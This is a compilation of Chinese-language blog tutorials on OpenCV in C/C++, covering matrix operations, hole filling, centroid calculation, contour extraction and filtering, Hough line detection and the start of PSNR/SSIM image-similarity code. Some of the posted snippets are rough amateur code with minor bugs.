（4） 直接访问（当数据的行对齐可能存在间隙时 possible alignment gaps）:

CvMat* M = cvCreateMat(4,4,CV_32FC1);
int step = M->step/sizeof(float);
float *data = M->data.fl;
(data+i*step)[j] = 3.0;


（5） 对于初始化后的矩阵进行直接访问:

double a[16];
CvMat Ma = cvMat(3, 4, CV_64FC1, a);
a[i*4+j] = 2.0; // Ma(i,j)=2.0;

3、矩阵/向量运算
（1） 矩阵之间的运算:

CvMat *Ma, *Mb, *Mc;
cvAdd(Ma, Mb, Mc); // Ma+Mb -> Mc
cvSub(Ma, Mb, Mc); // Ma-Mb -> Mc
cvMatMul(Ma, Mb, Mc); // Ma*Mb -> Mc

（2） 矩阵之间的元素级运算:

CvMat *Ma, *Mb, *Mc;
cvMul(Ma, Mb, Mc); // Ma.*Mb -> Mc
cvDiv(Ma, Mb, Mc); // Ma./Mb -> Mc
cvAddS(Ma, cvScalar(-10.0), Mc); // Ma.-10 -> Mc


（3） 向量乘积:

double va[] = {1, 2, 3};
double vb[] = {0, 0, 1};
double vc[3];

CvMat Va=cvMat(3, 1, CV_64FC1, va);
CvMat Vb=cvMat(3, 1, CV_64FC1, vb);
CvMat Vc=cvMat(3, 1, CV_64FC1, vc);

double res=cvDotProduct(&Va,&Vb); // 向量点乘: Va . Vb -> res
cvCrossProduct(&Va, &Vb, &Vc); // 向量叉乘: Va x Vb -> Vc

注意在进行叉乘运算时，Va, Vb, Vc 必须是仅有3个元素的向量.

（4） 单一矩阵的运算:

CvMat *Ma, *Mb;
cvTranspose(Ma, Mb); // 转置：transpose(Ma) -> Mb (注意转置阵不能返回给Ma本身)
CvScalar t = cvTrace(Ma); // 迹：trace(Ma) -> t.val[0]
double d = cvDet(Ma); // 行列式：det(Ma) -> d
cvInvert(Ma, Mb); // 逆矩阵：inv(Ma) -> Mb

（5） 非齐次线性方程求解:


CvMat* A = cvCreateMat(3,3,CV_32FC1);
CvMat* x = cvCreateMat(3,1,CV_32FC1);
CvMat* b = cvCreateMat(3,1,CV_32FC1);
cvSolve(&A, &b, &x); // solve (Ax=b) for x


（6） 特征值与特征向量 (矩阵为方阵):

CvMat* A = cvCreateMat(3,3,CV_32FC1);
CvMat* E = cvCreateMat(3,3,CV_32FC1);
CvMat* l = cvCreateMat(3,1,CV_32FC1);
cvEigenVV(A, E, l); // l = A 的特征值(递减顺序)
 //
 E = 对应的特征向量 (行向量)


（7） 奇异值分解（SVD）:====

CvMat* A = cvCreateMat(3,3,CV_32FC1);
CvMat* U = cvCreateMat(3,3,CV_32FC1);
CvMat* D = cvCreateMat(3,3,CV_32FC1);
CvMat* V = cvCreateMat(3,3,CV_32FC1);
cvSVD(A, D, U, V, CV_SVD_U_T|CV_SVD_V_T); // A = U D V^T

标志位使矩阵U或V按转置形式返回 (若不转置可能运算出错).








讨论帖：
http://bbs.csdn.net/topics/391542633﻿﻿
  在Matlab下，使用imfill可以很容易的完成孔洞填充操作，感觉这是一个极为常用的方法，然而不知道为什么Opencv里面却没有集成这个函数。在网上查了好多关于Opencv下的孔洞填充方法，大部分使用轮廓查找方法去做的，但对于这种方法，总感觉不是特别好。之前了解过冈萨雷斯那本书上的孔洞填充算法，所以想着手重新写一个。这里借鉴了冈萨雷斯书上的集合运算方法（并不完全一样）
    大致思路如下：
    0， 设原图像为 A。
    1， 首先A向外延展一到两个像素，并将值填充为背景色（0）,标记为B。
    2， 使用floodFill函数将B的大背景填充，填充值为前景色（255），种子点为（0，0）即可（步骤一可以确保（0，0）点位于大背景），标记为C。
    3， 将填充好的图像裁剪为原图像大小（去掉延展区域），标记为D。
    4， 将D取反与A相加即得填充的图像，E=A|（~D）。


// fillhole.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

 
#include <opencv2/core/core.hpp>    
#include <opencv2/highgui/highgui.hpp>  
#include "opencv2/imgproc/imgproc.hpp"
	 

	#pragma comment(lib,"opencv_core2410d.lib")                  
	#pragma comment(lib,"opencv_highgui2410d.lib")                  
	#pragma comment(lib,"opencv_imgproc2410d.lib")     
	  
using namespace std;  
using namespace cv;  




void fillHole(const Mat srcBw, Mat &dstBw)
{
	Size m_Size = srcBw.size();
	Mat Temp=Mat::zeros(m_Size.height+2,m_Size.width+2,srcBw.type());//延展图像
	srcBw.copyTo(Temp(Range(1, m_Size.height + 1), Range(1, m_Size.width + 1)));

	cv::floodFill(Temp, Point(0, 0), Scalar(255));

	Mat cutImg;//裁剪延展的图像
	Temp(Range(1, m_Size.height + 1), Range(1, m_Size.width + 1)).copyTo(cutImg);

	dstBw = srcBw | (~cutImg);
}

int main()
{
Mat img=cv::imread("23.jpg");

Mat gray;
cv::cvtColor(img, gray, CV_RGB2GRAY);

Mat bw;
cv::threshold(gray, bw, 0, 255, CV_THRESH_BINARY | CV_THRESH_OTSU);

Mat bwFill;
fillHole(bw, bwFill);

imshow("填充前", gray);
imshow("填充后", bwFill);
waitKey();
return 0;
}



我调试好的工程：点击打开链接
http://download.csdn.net/detail/wangyaninglm/9389329



﻿﻿






效果图：


代码：


// FindGravity.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <string>
#include "cv.h" 
#include "highgui.h" 




#include <opencv2/core/core.hpp>  
#include <opencv2/highgui/highgui.hpp>


#pragma comment(lib,"opencv_core2410d.lib")                
#pragma comment(lib,"opencv_highgui2410d.lib")                
#pragma comment(lib,"opencv_imgproc2410d.lib")   

using namespace std;
using namespace cv;


void FindGravity()
{
	
}
/** 计算二值图像的重心
* @param[in] src  输入的待处理图像
* @param[out] center 重心坐标
* @retval 0  操作成功
* @retval -1 操作失败
* @note 输入图像是二值化图像
* @note xc=M10/M00, yc=M01/M00, 其中 Mx_order,y_order=SUMx,y(I(x,y)*x^x_order*y^y_order)
 */
 static int aoiGravityCenter(IplImage *src, CvPoint ¢er)
 {
  //if(!src)
  // return GRAVITYCENTER__SRC_IS_NULL;
  double m00, m10, m01;
  CvMoments moment;
  cvMoments( src, &moment, 1);
  m00 = cvGetSpatialMoment( &moment, 0, 0 );
  if( m00 == 0) 
   return 1;
  m10 = cvGetSpatialMoment( &moment, 1, 0 );
  m01 = cvGetSpatialMoment( &moment, 0, 1 );
  center.x = (int) (m10/m00);
  center.y = (int) (m01/m00);
  return 0;
 } 

 IplImage* binary_image(IplImage* src)
 {
	 

		// cvThreshold( src, src, 100, 255, CV_THRESH_BINARY );//100 is the thredhold 
		 IplImage* one_channel = cvCreateImage(cvSize(src->width,src->height),IPL_DEPTH_8U,0);
		
		 for(int y = 0;y < src->height;y++)
		 {
			 char *ptr= src->imageData + y * src->widthStep;
			 char *p_one_channel = one_channel->imageData + y * one_channel->widthStep;
			 for(int x = 0;x < src->width;x++)
			 {
				 int temp = ptr[3*x];
				 if (temp != 0)//不是黑色也就是说不是背景
				 {
					 p_one_channel[x] = 255;//设置为白色
				 }
				 else
				 {
					 p_one_channel[x] = 0;

				 }
				 //ptr[3*x]=
				 //ptr[3*x+1]=
				 //ptr[3*x+2]=; 
			 }
		 }
		 return one_channel;


 }

int _tmain(int argc, _TCHAR* argv[])
{
	string str_name = "seg_right.bmp";

	IplImage* src; 
	IplImage* draw = cvLoadImage(str_name.c_str(),1);//绘制重心的图像
	
	if ((src = cvLoadImage(str_name.c_str(),1))!=0)
	{
		//src = binary_image(src);
		cvNamedWindow( "binary image", 1 ); 
		cvShowImage( "binary image", binary_image(src) );
	}
	CvPoint xy;
	aoiGravityCenter(binary_image(src),xy);
	cout<<xy.x<<endl;
	cout<<xy.y<<endl;


	cvCircle(draw,cvPoint(xy.x,xy.y),3,CV_RGB(0,0,255),5);

	cvNamedWindow( "重心", 1 ); 
	cvShowImage( "重心", draw ); 

	cvWaitKey(0);
	return 0;
}





我调试好的工程：点击打开链接
http://download.csdn.net/detail/wangyaninglm/9389338 






读入彩色3通道图像，转换成灰度图像，再转换成二值图像，完后检测轮廓。
 
// cvtcolor.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>



#include <opencv2/highgui/highgui.hpp>
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>

#pragma comment(lib, "opencv_highgui2410d.lib")
#pragma comment(lib, "opencv_core2410d.lib")
#pragma comment(lib, "opencv_imgproc2410d.lib")

using namespace cv;
using namespace std;

int main()
{
	string image_name = "swan.jpg";

	Mat src = imread(image_name);
	imshow("src",src);
				
	Mat gray(src.size(),CV_8U);
	cvtColor(src,gray,CV_BGR2GRAY);//转换成灰度图

	imshow("gray",gray);

	threshold(gray,gray,128,255,THRESH_BINARY);//转换成2值图像
	imshow("binary",gray);

	/////////////////////////////////////////////////////////////////////
	std::vector<std::vector<cv::Point>> contours;
	cv::findContours(gray, 
		contours, // a vector of contours 
		CV_RETR_EXTERNAL, // retrieve the external contours
		CV_CHAIN_APPROX_NONE); // retrieve all pixels of each contours

	// Print contours' length
	std::cout << "Contours: " << contours.size() << std::endl;
	std::vector<std::vector<cv::Point>>::const_iterator itContours= contours.begin();
	for ( ; itContours!=contours.end(); ++itContours) 
	{

		std::cout << "Size: " << itContours->size() << std::endl;
	}

	// draw black contours on white image
	cv::Mat result(gray.size(),CV_8U,cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		2); // with a thickness of 2

	cv::namedWindow("Contours");
	cv::imshow("Contours",result);


	// draw contours on the original image
	cv::Mat original= cv::imread(image_name);
	cv::drawContours(original,contours,
		-1, // draw all contours
		cv::Scalar(255,255,255), // in white
		-1); // with a thickness of 2

	cv::namedWindow("Contours on Animals");
	cv::imshow("Contours on Animals",original);

	// Let's now draw black contours on white image
	result.setTo(cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		-1); // with a thickness of 1
	//image= cv::imread("test.png",0);




	waitKey(0);

	return 0;
}



 
 
 
实现效果：
 

 
 
 
添加代码只显示不大不小的轮廓：
//除去太长或者太短的轮廓   
	int cmin = 10;   
	int cmax = 500000;   
	vector<std::vector<cv::Point>>::iterator itc = contours.begin();   
	while(itc != contours.end())   
	{   
		if(itc->size() < cmin || itc->size() > cmax)   
			itc = contours.erase(itc);   
		else   
			++itc;   

	}    

 
 
 
其他相关的一些说明：
http://blog.sina.com.cn/s/blog_8fc98fe501017ypb.html
先看提取轮廓的代码：



[cpp] 
view plaincopy

Mat image = imread("D:/picture/images/binaryGroup.bmp",0);  if(!image.data)       return -1;  imshow("源图像",image);      //获取轮廓   std::vector> contours;   //获取轮廓：   findContours(image,         //图像      contours,               //轮廓点                      //包含图像拓扑结构的信息（可选参数，这里没有选）      CV_RETR_EXTERNAL,           //获取轮廓的方法（这里获取外围轮廓）      CV_CHAIN_APPROX_NONE);      //轮廓近似的方法（这里不近似，获取全部轮廓）  //打印轮廓信息   std::cout<<"共有外围轮廓："<<contours.size()<<"条"<<std::endl;  std::vector>::const_iterator itContours = contours.begin();  for(;itContours != contours.end();++itContours)  {       std::cout<<"每个轮廓的长度: "<<itContours->size()<<std::endl;  }   

注意到轮廓的存储格式为std::vector>，他说明整个轮廓是若干条轮廓按一定顺序组成的，而每个轮廓中的点也是有顺序的。

画出轮廓就比较简单了：



[cpp] 
view plaincopy

//画出轮廓   Mat result(image.size(),CV_8U,Scalar(255));   //画出轮廓，参数为：画板，轮廓，轮廓指示（这里画出所有轮廓），颜色，线粗  drawContours(result,contours,-1,Scalar(0),2);   imshow("提取外围轮廓",result);   

还要注意提取轮廓的方法还有很多种，比如CV_RETR_LIST代表所有轮廓



[cpp] 
view plaincopy

findContours(image,         //图像      contours,               //轮廓点                      //包含图像拓扑结构的信息（可选参数，这里没有选）      CV_RETR_LIST,           //获取轮廓的方法（这里获取所有轮廓）      CV_CHAIN_APPROX_NONE);      //轮廓近似的方法（这里不近似，获取全部轮廓  //画出轮廓   drawContours(result,contours,-1,Scalar(0),2);   imshow("提取所有轮廓",result);   

通常，这样提取的轮廓包含一些我们不希望的轮廓（比如一些小洞），或者假如我们知道我们感兴趣的物体轮廓的大概范围时，我们就可以用下面的办法缩小目标范围：



[cpp] 
view plaincopy

//除去太长或者太短的轮廓   int cmin = 100;  int cmax = 1000;  std::vector>::const_iterator itc = contours.begin();  while(itc != contours.end())  {       if(itc->size() < cmin || itc->size() > cmax)          itc = contours.erase(itc);      else          ++itc;  }      //把结果画在源图像上：   Mat original = imread("D:/picture/images/group.jpg");  if(!original.data)       return -1;  drawContours(original,contours,-1,Scalar(255,255,255),2);  imshow("动物的轮廓",original);      //将轮廓重绘于白板上   result.setTo(Scalar(255));   drawContours(result,contours,-1,Scalar(0),1);   


怎么提取轮廓的特征呢？OpenCV提供了很多函数，我们展示其中的几个：



[cpp] 
view plaincopy

//轮廓的形状描述子   //外接矩形   Rect r0 = boundingRect(Mat(contours[0]));  rectangle(result,r0,Scalar(0),2);      //最小外接圆   float radius;   Point2f center;   minEnclosingCircle(Mat(contours[1]),center,radius);   circle(result,Point(center),static_cast<</span>int>(radius),Scalar(0),2);     //多边形估计   std::vector poly;   //参数为：输入图像的2维点集，输出结果，估计精度，是否闭合  approxPolyDP(Mat(contours[2]),poly,5,true);  std::cout<<"多边形大小："<<poly.size()<<std::endl;  //画出结果   std::vector::const_iterator itp = poly.begin();  while(itp != poly.end()-1)  {       line(result,*itp,*(itp+1),Scalar(0),2);      ++itp;   }   //将第一个点和最后一点连起来   line(result,*(poly.begin()),*(poly.end()-1),Scalar(128),2);        //计算凸包   std::vector hull;   convexHull(Mat(contours[3]),hull);   std::vector::const_iterator it= hull.begin();  while(it != (hull.end()-1))  {       line(result,*it,*(it+1),Scalar(0),2);      ++it;   }   line(result,*(hull.begin()),*(hull.end()-1),Scalar(0),2);        //计算矩信息   itc = contours.begin();   while(itc != contours.end())  {       //计算所有的距      Moments mom = moments(Mat(*itc++));      //计算并画出质心      circle(result,Point(mom.m10/mom.m00,mom.m01/mom.m00),2,Scalar(2),2);  }   imshow("形状描述子",result);   

我们再次看到，轮廓的确是有顺序的。值得注意的是矩信息：OpenCV提供了一个结构体Moments，它的元素就是计算好的矩信息，里面存放了常用的距。
其实，OpenCV还提供了许多其他的形状描述子，比如函数cv::minAreaRect计算了最小外界倾斜的矩形。函数 cv::contourArea估计轮廓区域的面积（里面的像素数）。函数cv::pointPolygonTest计算一个点是否在轮廓内，cv::matchShapes测量了2两个轮廓的相似程度等等。这里就不一一介绍了。
 

原文地址：findContours函数参数说明及相关函数作者：鸳都学童

findContours函数，这个函数的原型为：
void findContours(InputOutputArray image, OutputArrayOfArrays contours, OutputArray hierar-
chy, int mode, int method, Point offset=Point())
参数说明
输入图像image必须为一个2值单通道图像
contours参数为检测的轮廓数组，每一个轮廓用一个point类型的vector表示
hiararchy参数和轮廓个数相同，每个轮廓contours[ i ]对应4个hierarchy元素hierarchy[ i ][ 0 ] ~hierarchy[ i ][ 3 ]，分别表示后一个轮廓、前一个轮廓、父轮廓、内嵌轮廓的索引编号，如果没有对应项，该值设置为负数。
mode表示轮廓的检索模式

CV_RETR_EXTERNAL表示只检测外轮廓
CV_RETR_LIST检测的轮廓不建立等级关系
CV_RETR_CCOMP建立两个等级的轮廓，上面的一层为外边界，里面的一层为内孔的边界信息。如果内孔内还有一个连通物体，这个物体的边界也在顶层。
CV_RETR_TREE建立一个等级树结构的轮廓。具体参考contours.c这个demo

method为轮廓的近似办法

CV_CHAIN_APPROX_NONE存储所有的轮廓点，相邻的两个点的像素位置差不超过1，即max（abs（x1-x2），abs（y2-y1））==1
CV_CHAIN_APPROX_SIMPLE压缩水平方向，垂直方向，对角线方向的元素，只保留该方向的终点坐标，例如一个矩形轮廓只需4个点来保存轮廓信息
CV_CHAIN_APPROX_TC89_L1，CV_CHAIN_APPROX_TC89_KCOS使用teh-Chinl chain 近似算法

offset表示代表轮廓点的偏移量，可以设置为任意值。对ROI图像中找出的轮廓，并要在整个图像中进行分析时，这个参数还是很有用的。
findContours后会对输入的2值图像改变，所以如果不想改变该2值图像，需创建新mat来存放，findContours后的轮廓信息contours可能过于复杂不平滑，可以用approxPolyDP函数对该多边形曲线做适当近似
contourArea函数可以得到当前轮廓包含区域的大小，方便轮廓的筛选
findContours经常与drawContours配合使用，用来将轮廓绘制出来。其中第一个参数image表示目标图像，第二个参数contours表示输入的轮廓组，每一组轮廓由点vector构成，第三个参数contourIdx指明画第几个轮廓，如果该参数为负值，则画全部轮廓，第四个参数color为轮廓的颜色，第五个参数thickness为轮廓的线宽，如果为负值或CV_FILLED表示填充轮廓内部，第六个参数lineType为线型，第七个参数为轮廓结构信息，第八个参数为maxLevel
得到了复杂轮廓往往不适合特征的检测，这里再介绍一个点集凸包络的提取函数convexHull，输入参数就可以是contours组中的一个轮廓，返回外凸包络的点集
还可以得到轮廓的外包络矩形，使用函数boundingRect，如果想得到旋转的外包络矩形，使用函数minAreaRect，返回值为RotatedRect；也可以得到轮廓的外包络圆，对应的函数为minEnclosingCircle；想得到轮廓的外包络椭圆，对应的函数为fitEllipse，返回值也是RotatedRect，可以用ellipse函数画出对应的椭圆
如果想根据多边形的轮廓信息得到多边形的多阶矩，可以使用类moments，这个类可以得到多边形和光栅形状的3阶以内的所有矩，类内有变量m00，m10，m01，m20，m11，m02，m30，m21，m12，m03，比如多边形的质心为 x = m10 / m00，y = m01 / m00。
如果想获得一点与多边形封闭轮廓的信息，可以调用pointPolygonTest函数，这个函数返回值为该点距离轮廓最近边界的距离，为正值为在轮廓内部，负值为在轮廓外部，0表示在边界上。
 
转自：http://blog.sina.com.cn/s/blog_662c78590100z0rg.html


 
 
 
static int getContoursByCplus(char* Imgname, double minarea, double whRatio)
{
	cv::Mat src, dst, canny_output;
	/// Load source image and convert it to gray
	src = imread(Imgname, 0);

	if (!src.data)
	{
		std::cout << "read data error!" << std::endl;
		return -1;
	}
	blur(src, src, Size(3, 3));

	
	//the pram. for findContours,
	vector<vector<Point> > contours;
	vector<Vec4i> hierarchy;

	/// Detect edges using canny
	Canny(src, canny_output, 80, 255, 3);
	/// Find contours
	findContours(canny_output, contours, hierarchy, CV_RETR_TREE, CV_CHAIN_APPROX_SIMPLE, Point(0, 0));
	//CV_RETR_CCOMP, CV_CHAIN_APPROX_SIMPLE

	double maxarea = 0;
	int maxAreaIdx = 0;

	for (int i = 0; i<contours.size(); i++)
	{

		double tmparea = fabs(contourArea(contours[i]));
		if (tmparea>maxarea)
		{
			maxarea = tmparea;
			maxAreaIdx = i;
			continue;
		}
		
		if (tmparea < minarea)
		{
			//删除面积小于设定值的轮廓
			contours.erase(contours.begin() + i); 
			std::wcout << "delete a small area" << std::endl;
			continue;
		}
		//计算轮廓的直径宽高
		Rect aRect =boundingRect(contours[i]);
		if ((aRect.width / aRect.height)<whRatio)
		{
			//删除宽高比例小于设定值的轮廓
			contours.erase(contours.begin() + i); 
			std::wcout << "delete a unnomalRatio area" << std::endl;
			continue;
		}
	}
	/// Draw contours,彩色轮廓
	dst= Mat::zeros(canny_output.size(), CV_8UC3);
	for (int i = 0; i< contours.size(); i++)
	{
		//随机颜色
		Scalar color = Scalar(rng.uniform(0, 255), rng.uniform(0, 255), rng.uniform(0, 255));
		drawContours(dst, contours, i, color, 2, 8, hierarchy, 0, Point());
	}
	// Create Window
	char* source_window = "countors";
	namedWindow(source_window, CV_WINDOW_NORMAL);
	imshow(source_window, dst);
	cv:; waitKey(0);
	
	return 0;
}
 

cvDrawContours(gray_image,c,cvScalarAll(0),cvScalarAll(0),0,CV_FILLED);
用参数CV_FILLED就可以了 ，这样可以填充轮廓，进而得到模版有点类似图像分割了。
还有一种方法就是：
http://blog.csdn.net/augusdi/article/details/9011935
 






 
 
效果还是有点问题的，希望大家共同探讨一下
 


 

// FindRotation-angle.cpp : 定义控制台应用程序的入口点。
//

// findContours.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"



#include <iostream>
#include <vector>
#include <opencv2/opencv.hpp> 
#include <opencv2/core/core.hpp>
#include <opencv2/imgproc/imgproc.hpp>
#include <opencv2/highgui/highgui.hpp>


#pragma comment(lib,"opencv_core2410d.lib")      
#pragma comment(lib,"opencv_highgui2410d.lib")      
#pragma comment(lib,"opencv_imgproc2410d.lib") 

#define PI 3.1415926

using namespace std;
using namespace cv;



int hough_line(Mat src)
{
	//【1】载入原始图和Mat变量定义   
	Mat srcImage = src;//imread("1.jpg");  //工程目录下应该有一张名为1.jpg的素材图
	Mat midImage,dstImage;//临时变量和目标图的定义

	//【2】进行边缘检测和转化为灰度图
	Canny(srcImage, midImage, 50, 200, 3);//进行一此canny边缘检测
	cvtColor(midImage,dstImage, CV_GRAY2BGR);//转化边缘检测后的图为灰度图

	//【3】进行霍夫线变换
	vector<Vec4i> lines;//定义一个矢量结构lines用于存放得到的线段矢量集合
	HoughLinesP(midImage, lines, 1, CV_PI/180, 80, 50, 10 );

	//【4】依次在图中绘制出每条线段
	for( size_t i = 0; i < lines.size(); i++ )
	{
		Vec4i l = lines[i];
		line( dstImage, Point(l[0], l[1]), Point(l[2], l[3]), Scalar(186,88,255), 1, CV_AA);
	}

	//【5】显示原始图  
	imshow("【原始图】", srcImage);  

	//【6】边缘检测后的图 
	imshow("【边缘检测后的图】", midImage);  

	//【7】显示效果图  
	imshow("【效果图】", dstImage);  

	//waitKey(0);  

	return 0;  
}

int main()
{
	// Read input binary image

	char *image_name = "test.jpg";
	cv::Mat image = cv::imread(image_name,0);
	if (!image.data)
		return 0; 

	cv::namedWindow("Binary Image");
	cv::imshow("Binary Image",image);


	
	// 从文件中加载原图  
	   IplImage *pSrcImage = cvLoadImage(image_name, CV_LOAD_IMAGE_UNCHANGED);  
	  
		   // 转为2值图
		
	 cvThreshold(pSrcImage,pSrcImage,200,255,cv::THRESH_BINARY_INV);
		   
	
	   image = cv::Mat(pSrcImage,true);

	   cv::imwrite("binary.jpg",image);

	// Get the contours of the connected components
	std::vector<std::vector<cv::Point>> contours;
	cv::findContours(image, 
		contours, // a vector of contours 
		CV_RETR_EXTERNAL, // retrieve the external contours
		CV_CHAIN_APPROX_NONE); // retrieve all pixels of each contours

	// Print contours' length
	std::cout << "Contours: " << contours.size() << std::endl;
	std::vector<std::vector<cv::Point>>::const_iterator itContours= contours.begin();
	for ( ; itContours!=contours.end(); ++itContours) 
	{

		std::cout << "Size: " << itContours->size() << std::endl;
	}

	// draw black contours on white image
	cv::Mat result(image.size(),CV_8U,cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		2); // with a thickness of 2

	cv::namedWindow("Contours");
	cv::imshow("Contours",result);






	// Eliminate too short or too long contours
	int cmin= 100;  // minimum contour length
	int cmax= 1000; // maximum contour length
	std::vector<std::vector<cv::Point>>::const_iterator itc= contours.begin();
	while (itc!=contours.end()) {

		if (itc->size() < cmin || itc->size() > cmax)
			itc= contours.erase(itc);
		else 
			++itc;
	}

	// draw contours on the original image
	cv::Mat original= cv::imread(image_name);
	cv::drawContours(original,contours,
		-1, // draw all contours
		cv::Scalar(255,255,0), // in white
		2); // with a thickness of 2

	cv::namedWindow("Contours on original");
	cv::imshow("Contours on original",original);

	

	// Let's now draw black contours on white image
	result.setTo(cv::Scalar(255));
	cv::drawContours(result,contours,
		-1, // draw all contours
		cv::Scalar(0), // in black
		1); // with a thickness of 1
	image= cv::imread("binary.jpg",0);

	//imshow("lll",result);
	//waitKey(0);

	// testing the bounding box 
	//////////////////////////////////////////////////////////////////////////////
	//霍夫变换进行直线检测，此处使用的是probabilistic Hough transform（cv::HoughLinesP）而不是standard Hough transform（cv::HoughLines）

	cv::Mat result_line(image.size(),CV_8U,cv::Scalar(255));
	result_line = result.clone();

	hough_line(result_line);

	//Mat tempimage;

	//【2】进行边缘检测和转化为灰度图
	//Canny(result_line, tempimage, 50, 200, 3);//进行一此canny边缘检测
	//imshow("canny",tempimage);
	//waitKey(0);

	//cvtColor(tempimage,result_line, CV_GRAY2BGR);//转化边缘检测后的图为灰度图
	vector<Vec4i> lines;

	cv::HoughLinesP(result_line,lines,1,CV_PI/180,80,50,10);

	for(int i = 0; i < lines.size(); i++)
	{
		line(result_line,cv::Point(lines[i][0],lines[i][1]),cv::Point(lines[i][2],lines[i][3]),Scalar(0,0,0),2,8,0);
	}
	cv::namedWindow("line");
	cv::imshow("line",result_line);
	//waitKey(0);

	/////////////////////////////////////////////////////////////////////////////////////////////
	//

	//std::vector<std::vector<cv::Point>>::const_iterator itc_rec= contours.begin();
	//while (itc_rec!=contours.end())
	//{
	//	cv::Rect r0= cv::boundingRect(cv::Mat(*(itc_rec)));
	//	cv::rectangle(result,r0,cv::Scalar(0),2);
	//		++itc_rec;
	//}

	

	//cv::namedWindow("Some Shape descriptors");
	//cv::imshow("Some Shape descriptors",result);


	CvBox2D     End_Rage2D;
	CvPoint2D32f rectpoint[4];
	CvMemStorage *storage = cvCreateMemStorage(0);  //开辟内存空间


	CvSeq*      contour = NULL;     //CvSeq类型 存放检测到的图像轮廓边缘所有的像素值，坐标值特征的结构体以链表形式

	cvFindContours( pSrcImage, storage, &contour, sizeof(CvContour),CV_RETR_CCOMP, CV_CHAIN_APPROX_NONE);//这函数可选参数还有不少



	for(; contour; contour = contour->h_next)   //如果contour不为空，表示找到一个以上轮廓，这样写法只显示一个轮廓
		//如改为for(; contour; contour = contour->h_next) 就可以同时显示多个轮廓
	{  

		End_Rage2D = cvMinAreaRect2(contour);  
		//代入cvMinAreaRect2这个函数得到最小包围矩形  这里已得出被测物体的角度，宽度,高度，和中点坐标点存放在CvBox2D类型的结构体中，
		//主要工作基本结束。
		for(int i = 0;i< 4;i++)
		{
			  //CvArr* s=(CvArr*)&result;
			//cvLine(s,cvPointFrom32f(rectpoint[i]),cvPointFrom32f(rectpoint[(i+1)%4]),CV_G(0,0,255),2);
			line(result,cvPointFrom32f(rectpoint[i]),cvPointFrom32f(rectpoint[(i+1)%4]),Scalar(125),2);
		} 
		cvBoxPoints(End_Rage2D,rectpoint);
	
	std::cout <<" angle:\n"<<(float)End_Rage2D.angle << std::endl;      //被测物体旋转角度 
	
	}
	cv::imshow("lalalal",result);
	cv::waitKey();
	return 0;


}

 
 
 

 
这个是原来实现的代码的博客文章：
http://blog.csdn.net/wangyaninglm/article/details/41864251
 
 
参考文献：
http://blog.csdn.net/z397164725/article/details/7248096
http://blog.csdn.net/fdl19881/article/details/6730112
http://blog.csdn.net/mine1024/article/details/6044856









转载请注明出处：http://blog.csdn.net/wangyaninglm/article/details/43853435，
来自：shiter编写程序的艺术
文章大纲1.PSNR峰值信噪比原理简介参考资料代码效果2.感知哈希算法实现步骤代码效果3.计算特征点代码效果更新

对计算图像相似度的方法，本文做了如下总结，主要有三种办法：

1.PSNR峰值信噪比
PSNR（Peak Signal to Noise Ratio），一种全参考的图像质量评价指标。
原理简介
https://en.wikipedia.org/wiki/Peak_signal-to-noise_ratio
PSNR是最普遍和使用最为广泛的一种图像客观评价指标，然而它是基于对应像素点间的误差，即基于误差敏感的图像质量评价。由于并未考虑到人眼的视觉特性（人眼对空间频率较低的对比差异敏感度较高，人眼对亮度对比差异的敏感度较色度高，人眼对一个区域的感知结果会受到其周围邻近区域的影响等），因而经常出现评价结果与人的主观感觉不一致的情况。
SSIM（structural similarity）结构相似性，也是一种全参考的图像质量评价指标，它分别从亮度、对比度、结构三方面度量图像相似性。

SSIM取值范围[0,1]，值越大，表示图像失真越小.
在实际应用中，可以利用滑动窗将图像分块，令分块总数为N，考虑到窗口形状对分块的影响，采用高斯加权计算每一窗口的均值、方差以及协方差，然后计算对应块的结构相似度SSIM，最后将平均值作为两图像的结构相似性度量，即平均结构相似性MSSIM：

参考资料
[1] 峰值信噪比-维基百科
[2] 王宇庆，刘维亚，王勇. 一种基于局部方差和结构相似度的图像质量评价方法[J]. 光电子激光，2008。
[3]http://www.cnblogs.com/vincent2012/archive/2012/10/13/2723152.html
官方文档的说明，不过是GPU版本的，我们可以修改不用gpu不然还得重新编译
http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/highgui/video-input-psnr-ssim/video-input-psnr-ssim.html#videoinputpsnrmssim
http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/gpu/gpu-basics-similarity/gpu-basics-similarity.html?highlight=psnr

代码
// PSNR.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <iostream>                   // Console I/O
#include <sstream>                    // String to number conversion

#include <opencv2/core/core.hpp>      // Basic OpenCV structures
#include <opencv2/imgproc/imgproc.hpp>// Image processing methods for the CPU
#include <opencv2/highgui/highgui.hpp>// Read images
#include <opencv2/gpu/gpu.hpp>        // GPU structures and methods

using namespace std;
using namespace cv;

double getPSNR(const Mat& I1, const Mat& I2);      // CPU versions
Scalar getMSSIM( const Mat& I1, const Mat& I2);

double getPSNR_GPU(const Mat& I1, const Mat& I2);  // Basic GPU versions
Scalar getMSSIM_GPU( const Mat& I1, const Mat& I2);

struct BufferPSNR                                     // Optimized GPU versions
{   // Data allocations are very expensive on GPU. Use a buffer to solve: allocate once reuse later.
	gpu::GpuMat gI1, gI2, gs, t1,t2;

	gpu::GpuMat buf;
};
double getPSNR_GPU_optimized(const Mat& I1, const Mat& I2, BufferPSNR& b);

struct BufferMSSIM                                     // Optimized GPU versions
{   // Data allocations are very expensive on GPU. Use a buffer to solve: allocate once reuse later.
	gpu::GpuMat gI1, gI2, gs, t1,t2;

	gpu::GpuMat I1_2, I2_2, I1_I2;
	vector<gpu::GpuMat> vI1, vI2;

	gpu::GpuMat mu1, mu2; 
	gpu::GpuMat mu1_2, mu2_2, mu1_mu2; 

	gpu::GpuMat sigma1_2, sigma2_2, sigma12; 
	gpu::GpuMat t3; 

	gpu::GpuMat ssim_map;

	gpu::GpuMat buf;
};
